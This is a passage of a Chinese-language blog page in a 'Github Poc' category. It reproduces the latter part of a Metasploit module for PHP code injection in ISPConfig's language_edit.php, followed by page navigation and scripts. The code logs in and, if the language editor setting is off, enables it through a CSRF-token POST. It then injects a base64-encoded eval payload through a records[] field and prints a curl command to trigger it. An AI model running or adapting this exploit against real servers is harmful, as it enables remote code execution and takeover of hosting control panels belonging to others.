res&amp;.code == <span class="hljs-number">200</span> &amp;&amp; res.body.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;language_edit&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Language editor is accessible - admin_allow_langedit appears to be enabled&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">elsif</span> res&amp;.code == <span class="hljs-number">403</span><br>      print_warning(<span class="hljs-string">&#x27;Language editor access denied - admin_allow_langedit may be disabled&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Could not determine language editor accessibility&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">enable_langedit_permission</span><br>    print_status(<span class="hljs-string">&#x27;Attempting to enable admin_allow_langedit...&#x27;</span>)<br>    <br>    <span class="hljs-comment"># Try to access the system settings page</span><br>    settings_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;system_config.php&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; settings_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <br>    <span class="hljs-keyword">unless</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_warning(<span class="hljs-string">&#x27;Could not access system configuration page&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>    <br>    doc = res.get_html_document<br>    csrf_id = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_id&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    csrf_key = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_key&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <br>    <span class="hljs-keyword">unless</span> csrf_id &amp;&amp; csrf_key<br>      print_warning(<span class="hljs-string">&#x27;Could not extract CSRF tokens from system config page&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>    <br>    <span class="hljs-comment"># Try to enable the setting</span><br>    enable_data = &#123;<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;admin_allow_langedit&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span>,<br>      <span class="hljs-string">&#x27;action&#x27;</span> =&gt; <span class="hljs-string">&#x27;save&#x27;</span><br>    &#125;<br>    <br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; settings_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; enable_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <br>    <span class="hljs-keyword">if</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;Successfully enabled admin_allow_langedit&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Failed to enable admin_allow_langedit&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">inject_payload</span><br>    print_status(<span class="hljs-string">&#x27;Injecting PHP payload...&#x27;</span>)<br>    <span class="hljs-variable">@payload_file</span> = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;<span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alpha_lower(<span class="hljs-number">8</span>)&#125;</span>.php&quot;</span><br>    b64_payload = <span class="hljs-title class_">Base64</span>.strict_encode64(payload.encoded)<br>    injection = <span class="hljs-string">&quot;&#x27;];eval(base64_decode(&#x27;<span class="hljs-subst">#&#123;b64_payload&#125;</span>&#x27;));die;#&quot;</span><br>    lang_file = <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Unable to access language_edit.php&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    doc = res.get_html_document<br>    csrf_id = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_id&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    csrf_key = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_key&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <span class="hljs-keyword">unless</span> csrf_id &amp;&amp; csrf_key<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;CSRF tokens not found!&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>    print_good(<span class="hljs-string">&quot;Extracted CSRF tokens: ID=<span class="hljs-subst">#&#123;csrf_id[<span class="hljs-number">0</span>..<span class="hljs-number">10</span>]&#125;</span>..., KEY=<span class="hljs-subst">#&#123;csrf_key[<span class="hljs-number">0</span>..<span class="hljs-number">10</span>]&#125;</span>...&quot;</span>)<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\]&#x27;</span> =&gt; injection<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Injection request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    payload_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">@payload_file</span>)<br>    print_good(<span class="hljs-string">&quot;Payload successfully injected: <span class="hljs-subst">#&#123;<span class="hljs-variable">@payload_file</span>&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload_url<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    <span class="hljs-keyword">unless</span> authenticate<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>, <span class="hljs-string">&#x27;Login failed&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>    <br>    <span class="hljs-comment"># Check if language editor permissions are enabled</span><br>    <span class="hljs-keyword">unless</span> check_langedit_permission<br>      print_warning(<span class="hljs-string">&#x27;admin_allow_langedit appears to be disabled&#x27;</span>)<br>      print_status(<span class="hljs-string">&#x27;Attempting to enable admin_allow_langedit...&#x27;</span>)<br>      <br>      <span class="hljs-keyword">if</span> enable_langedit_permission<br>        print_good(<span class="hljs-string">&#x27;Successfully enabled admin_allow_langedit, retrying exploit...&#x27;</span>)<br>        <span class="hljs-comment"># Re-check permissions after enabling</span><br>        <span class="hljs-keyword">unless</span> check_langedit_permission<br>          fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Failed to enable admin_allow_langedit or language editor still not accessible&#x27;</span>)<br>        <span class="hljs-keyword">end</span><br>      <span class="hljs-keyword">else</span><br>        fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Could not enable admin_allow_langedit - exploit requires this setting to be enabled&#x27;</span>)<br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    <br>    payload_url = inject_payload<br>    print_status(<span class="hljs-string">&#x27;Starting payload handler...&#x27;</span>)<br>    print_status(<span class="hljs-string">&#x27;Manual trigger information:&#x27;</span>)<br>    print_line(<span class="hljs-string">&quot;URL: <span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&quot;</span>)<br>    print_line(<span class="hljs-string">&quot;Manual trigger: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&#x27;&quot;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Github-Poc/" class="category-chain-item">Github Poc</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/rapid7-metasploit-framework-github-issues/" class="print-no-link">#rapid7/metasploit-framework:github issues</a>
+      
+        <a href="/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/" class="print-no-link">#代码注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ISPConfig language_editphp PHP代码注入</div>
+      <div>http://example.com/2025/06/30/github_938639146/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lianccc</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/06/30/github_2006755968/" title="ProFTPD 135 mod_copy模块命令执行漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ProFTPD 135 mod_copy模块命令执行漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/06/30/github_443250844/" title="SonicWall Email Security 权限控制漏洞">
+                        <span class="hidden-mobile">SonicWall Email Security 权限控制漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
